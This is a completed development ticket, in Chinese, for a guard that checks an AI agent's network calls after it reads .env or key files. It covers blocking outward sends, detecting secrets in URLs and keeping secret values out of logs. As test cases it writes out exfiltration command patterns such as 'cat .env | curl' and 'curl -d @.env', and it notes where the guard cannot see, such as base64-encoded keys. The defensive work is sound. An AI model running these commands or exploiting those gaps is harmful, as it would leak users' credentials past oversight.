# 30 — 读过密钥后只拦往外送

Status: done
Blocked by: 05（时序规则引擎与 v1 规则模板）
Spec: [第一阶段规格](../spec.md) 第 9 节（守卫、v1 规则模板、底线）、第 21 节（实现细节补充）

## What to build

v1 规则模板里"读过 `.env` 或密钥文件之后不许对外发送、不许发 HTTP 请求"原来按最严算：读过之后，同一任务（或同一会话段）里所有联网操作一律禁止，连装依赖、`git pull` 都做不了，碰过 `.env` 的开发任务因此卡死。用户 2026-10-08 定：改成**只拦往外送**。

- 读过密钥之后仍一律禁止的：非 GET 的 HTTP 请求（POST、PUT、PATCH、DELETE 等），带数据或上传的请求（比如 curl 的 `-d`、`--data*`、`-F`、`-T`、`--upload-file`，wget 的 `--post-*`），发消息、发邮件，推送，发布，建远端仓库，以及看不出方向的联网脚本（脚本扫描报了用到联网库的）。
- 读过密钥之后照常按处置走的：只读的 GET / HEAD 请求和下载、装依赖、`git pull` / `fetch` / `clone`。
- "对外内容不许含密钥"（底线"把凭据写进对外内容"用的同一套密钥形态和取内容口径）扩展到 GET 的网址（含查询串、带凭据的网址如 `https://<token>@host/…`）和联网命令的参数，命中即"永不"，不管之前读没读过密钥。

"往外送"和"往下拉"的区分只在这条规则里用，不改变联网开关（关着时一律拒绝）和各关注类别的既有判定。

## Acceptance criteria

- [x] 守卫切面（表格和场景文件）：读过 `.env` 之后，POST 请求、带 `-d` 的 curl、`-F` 上传、推送、建远端仓库、发消息、用到联网库的脚本都判一律禁止；GET 请求、`npm install`、`git pull`、`git clone` 不再被这条规则拦，按原有处置判定。
- [x] 守卫切面：没读过密钥时，GET 网址或联网命令参数里含密钥形态的字符串（查询串里、网址的用户信息里），判"永不"。
- [x] 守卫切面：bash 里同一管道或先后执行的组合（`cat .env | curl …`、`curl -d @.env …`、先 `cat .env` 再 `curl -X POST …`）仍被拦；`cat .env` 之后单独一个 `curl https://example.com/` 不被这条规则拦。
- [x] 带类型的工具（28 号票）和通用 bash 里的同一操作结论一致。
- [x] 主切面：一个维护者会话里读过 `.env` 之后装依赖成功执行，推送被拦下并说明原因。
- [x] 文档：开发说明里守卫一节、规则模板的注释和说明文字同步改。
- [x] 所有测试通过（vitest），lint（oxlint）无报错。

## Notes

- 剩余风险写进开发说明：密钥被编码或变形后（比如 base64）放进 GET 网址，正则认不出。
- 28 号票（带类型的 bash 工具）正在并行修改守卫的工具注册表，改动要小而集中，收尾前变基到最新 main。

## Comments

做法和决定（2026-10-08，实现时）：

- **"往外送"是规则看到的一步上的新字段 `$current.outward`**（`rule-steps.ts`，照 ADR-0005"推出来的字段放在一步上"）。v1 模板只把 `when` 从 `$current.sends` 换成它，规则仍是 planguard 格式、走同一套校验；`STEP_FIELDS` 加了 `outward`，用户的规则和 26 号票编译出的规则也能用。
- **认法放在已有的位置**：注册表加 `pullOnly`（只往下拉：`install_deps`、`install_global`、`git_fetch`、`network_read`）和参数上的 `payload`（请求带出去的数据）；`http_request` 加参数 `data`（`payload`），curl / wget / httpie 的数据和上传选项在 `shell/programs.ts` 原来认方法的地方一起填上，"方法写成 GET 但带数据"的（`curl -G -d …`、`curl -X GET --data-binary …`）也算往外送。只读方法表仍是 `READ_ONLY_HTTP_METHODS`。没标 `pullOnly` 的联网工具（包括以后的 MCP 工具，比如网页搜索）默认按往外送算，27 号票登记 MCP 工具时按需标。
- **管道和命令替换**：票里要求 `cat .env | curl …` 仍被拦、`cat .env` 之后单独一个 `curl https://example.com/` 不拦。只按方向判的话，`curl "https://x/?q=$(cat .env)"`、`K=$(cat .env); curl "…?k=$K"`、`cat .env | xargs curl …` 都是 GET，会把刚读的密钥原样带出去，正则也看不见。所以 bash 拆出的调用多带一个 `unseenInput`（`shell/split.ts`、`programs.ts`）：标准输入来自管道、here-doc 或重定向，命令里（含命令前的赋值）有没法静态确定的词，xargs 补上的参数，curl `-K`、wget `-i` / `-e` 这类配置和输入文件——守卫看不全它发了什么，这样的联网调用按往外送算。代价：读过密钥之后，网址里带变量的下载（`curl -o x "https://…/$VER/…"`）也会被拦，要写成静态网址或请用户处理。`cat .env; curl https://example.com/`（同一条命令里先后执行、网址静态）不拦。（评审后：`unseenInput` 也记进效果日志，见下。）
- **下载并运行软件包（`npx` 这类，`run_package`）按往外送算**：跑的是任意代码，看不出方向，票里允许的清单里也没有它。连远端主机的（`scp`、`ssh` 这类，`network_command`）同样按往外送算，下载方向的 `scp host:file .` 也拆不出来。
- **对外内容的口径**（`secrets.ts` 的 `outboundTextOf`，底线和 v1 模板共用）：会联网的工具（`usesNetwork`，原名 `sendsOut`）除路径以外的全部参数（数组逐个），加上 bash 那段命令原文。以前只看 `outbound` 工具的内容、收件人、网址类参数，`git clone https://<token>@…`、`npm install git+https://<token>@…`、带类型的 `git_push` 的 `remote`、`install_deps` 的包名、MCP 联网工具的其他参数都查不到。底线的判定也从只查 `outbound` 的工具改成查会联网的工具，两处一致。
- **新加一种密钥形态"网址里的密码或 token"**（`url_credentials`：`scheme://用户名:密码@`、`scheme://<20 位以上的 token>@`），对应票里"带凭据的网址如 `https://<token>@host/…`"；`ssh://git@host`、`git@host:repo` 不算。它和别的形态一样也用于邮件正文这类对外内容（文档里写的 `postgres://user:pass@localhost` 也会被拦，宁可多拦）。查询串里 `access_token=`、`client_secret=` 这类带前缀的键名现有的"赋值形式"正则认不出，没有改，免得把分页 token 之类也拦下。
- 顺带修了 `curl --data-urlencode '名字@文件'` 不认读文件的问题（读 `.env` 发出去的组合靠它）。
- **主切面**：28 号票已合并，用它的测试接缝 `maintainerToolkit`、PATH 上假的 pnpm、本地裸仓库（`test/main/secret-read-outbound.test.ts`）：维护者会话（起草计划那一段）读 `.env` → 跑测试 → 带类型的装依赖、bash 的 `pnpm install` 都执行成功 → 带类型的推送、bash 的 `git push` 都判永不、不出审批卡，模型收到原因，远端没有任何分支。15 号票的项目维护者还没合并，用的是任务维护者。

评审后修改（2026-10-08，两路评审的 11 条）：

- **按读过的密钥值查**（主会话定）：守护进程在一次调用执行成功之后，看它读到的 `.env` 和密钥文件（路径参数是读或不知道读写，路径或真实路径的名字像密钥文件），把里面的值收进这个任务（不属于任务的是这一段会话）的内存里（`guard-runtime/read-secrets.ts`；拆值是 `secret-files.ts` 的 `secretValuesIn`：`.env` 每行的值，去掉 export、成对引号和行尾注释，8 个字符以上；别的密钥文件整段去掉空白，256 KB 以上的不读），判定时作为环境事实 `facts.secretValues` 交给守卫（判定仍是纯函数）。会联网的调用的对外内容里出现其中任何一个值（原样、`%xx` 和表单 `+` 的 URL 编码、标准和网址安全的 base64，去掉空白也比）就是底线"把凭据写进对外内容"（永不），v1 模板"对外内容不许含密钥"同样命中；说明里只写"之前读过的密钥文件里的值"，不带出值本身。只放内存、不落盘、不进事件日志，守护进程重启后就没了。注意：模型用 `read` 读 `.env` 的结果本身会照常进会话（工具调用记录的结果摘要、效果摘要的开头一小段），这是 07 号票的既有做法，这次没动。`.env` 里 8 个字符以上的普通配置值（比如一个网址）也会被当成读过的值，之后网址里出现它就判永不，写进了开发说明的剩余风险。
- **`gh api -X GET` 带 `-f` / `-F` / `--raw-field` / `--field` / `--input`**：拆成 `network_read`，带上 `data`（`payload`）；`outward` 里"带了请求数据"排在 `pullOnly` 前面，所以算往外送，类别仍按 GET（不落入类别），和 `curl -G -d` 一致。
- **PowerShell 下载**：`Invoke-WebRequest` / `Invoke-RestMethod` 和别名 `iwr`、`irm` 改成和 curl 一样拆成 `http_request`（以前是 `network_command`，一律算对外发送）：`-Method` / `-CustomMethod` 不写是 GET，`-Body`、`-InFile`、`-Form` 是 `data`，`-InFile` 读文件、`-OutFile` 写文件，参数名不分大小写、可以只写开头。没带数据的 GET 算往下拉，类别也按方法（GET 不落入类别）。PowerShell 里的 `curl`、`wget` 别名守卫看不到（`powershell -Command` 按拆不开算），Git Bash 里的 curl、wget 是真的那两个程序。`iwr`、`irm` 也进了联网程序名单，脚本扫描跟着认。
- **效果日志带上 `unseenInput`**（`EffectRecord.unseenInput?: true`），时序规则的历史步骤照它算 `$prior.outward`。
- **`url_credentials` 收窄**：`token@` 的写法要像令牌（20 位以上、字母数字都有），纯字母或较短的用户名不算；`用户名:密码@` 照旧算。底线范围扩大保留。
- **规范小修**：删掉 `ProgramContext` 上没人读的或运算——`Invocation` 用 `ctx.unseenInput || extraOperands` 起头，emit 时原样交出去；"只读请求"收成 `tool-registry.ts` 的 `isReadOnlyMethod`（不分大小写）和 `isReadOnlyRequest`（再加上没带数据，`carriesPayload`），`httpMethodRule` 和 `outward` 共用，模板里的 `notReadOnly` 是同一张表写成规则的样子（规则看到的方法已经规范化成大写）；记录类型里的 `unseenInput` 一律 `?: true`，判定输出直接 `{ ...拆出的调用, origin: "shell" }`；`outward` 第一行直接交给 `sends`；`outboundTextOf` 用 `argEntriesOf(tool, args, { except: ["path"] })`。
- **理清名字**：`sendsOut` 改名 `usesNetwork`（会联网，不管方向）；`outbound` 的注释改成"会把内容发给收件人或网址，'不重复发'看它"，`network_read` 去掉 `outbound`（它只往下拉，没有收件人参数，以前标它只为查密钥，现在查密钥看 `usesNetwork`）；模板里的 `sending` / `networked` 改成 `mayGoOut` / `networkTools`；几个说法的区别写在 `tool-registry.ts` 里 `ToolDescriptor` 后面；模板开头的 `$current.sends` 示例换成 `$current.outward`、`$current.secrets`。
- **术语表**：`CONTEXT.md` 加了"往外送"和"往下拉"。
- **密钥不进事件日志**（主会话追加）：读了密钥文件的调用，工具调用记录的结果摘要、效果日志的效果摘要里不记文件内容，换成"（密钥文件的内容不记录）"；工具调用记录、效果日志（摘要和参数）、审批（参数、参数摘要、守卫的说明）、"交给我做"事项写进事件日志之前，用本任务或本会话段读过的密钥值再擦一遍（原样、base64、URL 编码换成"（密钥）"）。读到的值改成放行执行过就收（执行出错的也收，模型可能已经看到内容），并且在写这次调用自己的记录之前收。pi 会话文件里模型看到的原始结果保留，写进了开发说明。擦不到的：模型回复正文里写出的值、多行的私钥原文、读之前就出现过的、守护进程重启之后才出现的。主切面加了一条：读 `.env`、bash 里 grep、把值写进普通文件再 cat、base64 打出来，事件库（数据库区的文件）里找不到这个值，pi 会话文件里有。

- 2026-10-08 完成：经两轴代码评审并按意见修改（按读过的密钥值查对外内容、gh api 与 PowerShell 下载、效果日志带 unseenInput、收窄网址凭据、密钥不进事件日志）后合并进 main（2c2867f）。
